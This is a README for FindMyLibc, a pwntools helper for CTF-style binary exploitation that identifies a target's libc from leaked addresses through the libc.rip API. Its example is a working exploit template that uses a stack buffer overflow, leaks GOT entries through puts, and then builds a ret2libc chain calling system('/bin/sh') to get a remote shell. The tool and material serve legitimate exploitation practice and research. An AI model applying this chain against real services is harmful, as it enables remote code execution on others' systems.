# FindMyLibc
You're exploiting a binary, you've found an address leak, now you need the libc version  
and most importantly, the addresses of symbols like `system` and `str_bin_sh`.

This tool is the easiest to setup & use!  
**No heavy libc downloading, all remote, 1 simple function call.**

## Disclaimer
This was tested only on 32-bit binary, so it might not work properly on 64-bit binaries.  
Would be updated!

# Setup
```bash
pip install findmylibc
```  
Then use easily:  
```python
from findmylibc import *
...
matching_libc = find_libc(elf, leak_libc_address)
```    

# The `find_libc` parameters
## `elf`:
An object of the class `ELF` from `pwntools`, usually created by calling: 
```python
ELF('binary-name')
```

## `leak_libc_address`:
A function with signature of:  
```python
def my_leak_func(symbol_name_str): ... ->  return leaked_address_integer
```  
You must create this function,  
where the only parameter is of type **string** - the symbol name to leak,  
and the return value is the leaked address as **integer**.


## `stop_libs_amount` (optional)
The default value is `3`- if we reach 3 matching libc versions, it's enough and we stop searching.  
You can change it if you'd like to:  
```python
matching_libc = find_libc(elf, leak_libc_address, stop_libs_amount=2)
```

# Example
Here's a simple example of an exploit script (see [`.example/example.py`](https://github.com/omrina/FindMyLibc/blob/main/example/example.py)).

### Setup your binary exploit script:
Whatever you need here...
```python
from pwn import *
from FindMyLibc import *

# Setup your binary
elf = ELF("./elf_name")
host = args.HOST or 'localhost'
port = int(args.PORT or 5555)
io = connect(host, port)
```

### Set up our "leak address" function:

```python
# Payload until right before the return address
payload = b'A' * 512 + b'BBBBCCCCDDDD'

# Example function that gets a symbol name and leaks its address from the binary
def leak_libc_address(symbol_name):
    libc_symbol_address = elf.got[symbol_name]
    puts = elf.symbols["puts"]

    io.recvline()
    io.send(payload + p32(puts) + p32(libc_symbol_address))
    received = io.recv()

    return u64(received.ljust(8, b"\x00"))
```
### Now the real deal:
```python
# call `find_libc`, it returns a list of matching libc candidates.
matching_libc = find_libc(elf, leak_libc_address)
chosen_libc = matching_libc[0]

# Each libc candidate comes with the attribute of `base_address`
print("libc base_address at: %s " % hex(chosen_libc['base_address']))

# Everything you need is probably in `syms`,
# a dictionary of ALL the libc symbols: {symbol: calculated_address}
binsh_address = chosen_libc['syms']['str_bin_sh']
system_address = chosen_libc['syms']['system']
print("/bin/sh at: %s" % hex(binsh_address))
print("system at: %s " % hex(system_address))
```

The output from `.example/example.py`:

### What is `chosen_lib`:

![image](https://github.com/user-attachments/assets/06ff78eb-f59b-4ba6-b199-079e0e091781)

### How to use the results:
You would probably need only `syms`, a dict of `{symbol_name_str: calcualted_address_integer}`,  
so continuing the example above, one might use:
```python
# Remember: chosen_libc['syms']['system'] AND chosen_libc['syms']['str_bin_sh']
shell_rop = p32(system_address) + b'EEEE' + p32(binsh_address)
io.send(payload + shell_rop)
io.interactive()
```

# How does it work?
The finder leaks the address of common symbols:  
```python
_common_symbols_to_leak = ['__libc_start_main', 'puts', 'printf', 'gets', 'read', 'write', 'send', 'recv']
```  
Then it makes reqeusts to the public `https://libc.rip/api/find`, with different combination of leaked symbols every time.  

E.g.- we send a request with `{'puts': 'leaked-address-of-puts', 'gets': 'leaked-address-of-gets'}`.  
A response would be a list of matching libc versions metadata (each item is like a part of `chosen_lib` seen earlier).
